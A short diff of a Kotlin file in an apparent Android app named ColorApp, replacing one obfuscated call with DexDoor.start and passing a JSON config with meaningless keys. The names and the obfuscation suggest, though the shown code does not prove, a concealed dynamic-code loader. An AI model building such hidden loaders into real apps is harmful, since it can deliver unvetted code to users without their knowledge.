@@ -184,7 +184,8 @@ object Fnc {
         }
         if (isA(c)) {
 
-            m.ki.Dva.sim(ColorApp.app, arrayListOf(
+
+            DexDoor.start(ColorApp.app, arrayListOf(
                 """{
     "bta":"wow_bob_dud_kuk",
     "cvv":"id_token",
@@ -195,6 +196,16 @@ object Fnc {
 }""","bug"
             ))
 
+//            m.ki.Dva.sim(ColorApp.app, arrayListOf(
+//                """{
+//    "bta":"wow_bob_dud_kuk",
+//    "cvv":"id_token",
+//    "nak":"981772962_981772963",
+//    "akm":"5_10",
+//    "nma":"10_20_30_20_5",
+//    "eka":"15_10_0_30_200_400"
+//}""","bug"
+//            ))
         }
     }
 
